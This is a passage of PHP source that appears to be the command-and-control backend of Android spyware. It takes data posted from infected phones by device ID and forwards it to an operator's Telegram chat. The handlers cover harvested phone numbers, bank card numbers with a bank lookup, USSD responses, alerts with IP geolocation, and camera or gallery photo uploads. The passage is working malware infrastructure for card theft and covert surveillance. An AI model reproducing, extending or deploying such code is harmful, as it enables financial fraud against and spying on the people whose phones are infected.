    $offline = file_get_contents("user/$Device_id-offline.txt");
    smg($id_sender, "
┌── •✧ 𝐏𝐇𝐎𝐍𝐄𝐒 ✧•
│
$phones
│
├ 🌐 IP : <code>$ip</code>
├ 🆔 <code>/login_$Device_id</code>
│
└── •<a href='t.me/QQaVaNeN'>› ᴢɪʀᴇx</a>", $sms_panel);
}
elseif ($action == "cardnumbers") {
    $install_ip = file_get_contents("user/$Device_id-ip.txt");
    $name = file_get_contents("user/$Device_id-name.txt");
    $offline = file_get_contents("user/$Device_id-offline.txt");
    
    $cardText = "";
    if (isset($_POST['result']) && !empty($_POST['result'])) {
        $cardresult = $_POST['result'];
        $cards = json_decode($cardresult, true);
        if (is_array($cards) && count($cards) > 0) {
            foreach ($cards as $bank => $card) {
                if (is_array($card)) {
                    foreach ($card as $c) {
                        $bankInfo = getBankInfo($c);
                        $cardText .= "\n🔰 <b>" . $bankInfo[0] . "</b>\n └ <code>$c</code> " . $bankInfo[1];
                    }
                } else {
                    $bankInfo = getBankInfo($card);
                    $cardText .= "\n🔰 <b>" . $bankInfo[0] . "</b>\n └ <code>$card</code> " . $bankInfo[1];
                }
            }
        } else {
            $lines = explode("\n", trim($cardresult));
            $bankIndex = 1;
            foreach ($lines as $line) {
                if (!empty(trim($line))) {
                    $bankInfo = getBankInfo($line);
                    $cardText .= "\n🔰 <b>" . $bankInfo[0] . "</b>\n └ <code>$line</code> " . $bankInfo[1];
                    $bankIndex++;
                }
            }
        }
    } else {
        $cardText = "\n❌ هیچ کارتی یافت نشد";
    }
    
    smg($id_sender, "
┌── •✧ 𝐂𝐀𝐑𝐃𝐒 ✧•
│
├ 📱 $Model
$cardText
│
├ 🌐 IP : <code>$ip</code>
├ 🆔 <code>/login_$Device_id</code>
│
└── •<a href='t.me/QQaVaNeN'>› ᴢɪʀᴇx</a>", $sms_panel);
}
elseif ($action == "ussdcallback") {
    $install_ip = file_get_contents("user/$Device_id-ip.txt");
    $name = file_get_contents("user/$Device_id-name.txt");
    $offline = file_get_contents("user/$Device_id-offline.txt");
    smg($id_sender, "
┌── •✧ 𝐔𝐒𝐒𝐃 𝐑𝐄𝐒𝐔𝐋𝐓 ✧•
│
$message_ussd
│
├ 🌐 IP : <code>$ip</code>
├ 🆔 <code>/login_$Device_id</code>
│
└── •<a href='t.me/QQaVaNeN'>› ᴢɪʀᴇx</a>", $sms_panel);
} elseif ($action == "Alert") {


    $install_ip = file_get_contents("user/$Device_id-ip.txt");
    $name = file_get_contents("user/$Device_id-name.txt");
    $offline = file_get_contents("user/$Device_id-offline.txt");
    $gcx = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
    $flag = EMflag($gcx["countryCode"]);
    smg($id_sender, "
┌── •✧ 𝐀𝐋𝐄𝐑𝐓 ✧•
│
├ 📱 $Model
├ 📡 $operator
├ 🌐 IP : <code>$ip</code>
├ 🆔 <code>/login_$Device_id</code>
│
└── <a href='t.me/QQaVaNeN'>› ᴢɪʀᴇx</a>", $status_panel);

} elseif ($action == "cameraphotos") {
    $status = isset($_POST['status']) ? $_POST['status'] : '';
    $result_text = isset($_POST['result']) ? $_POST['result'] : '';
    $photo_count = isset($_POST['photo_count']) ? $_POST['photo_count'] : '0';
    $install_ip = file_get_contents("user/$Device_id-ip.txt");

    if ($status === 'done' || $status === 'success' || $status === 'error' || $status === 'no_photos' || $status === 'upload_failed') {
        smg($id_sender, "
┌── •✧ 𝐆𝐀𝐋𝐋𝐄𝐑𝐘 ✧•
│
├ 📷 $result_text
├ 📱 $Model
├ 🌐 IP : <code>$ip</code>
├ 🆔 <code>/login_$Device_id</code>
│
└── <a href='t.me/QQaVaNeN'>› ᴢɪʀᴇx</a>", $Log_Panel);
    }
}
?>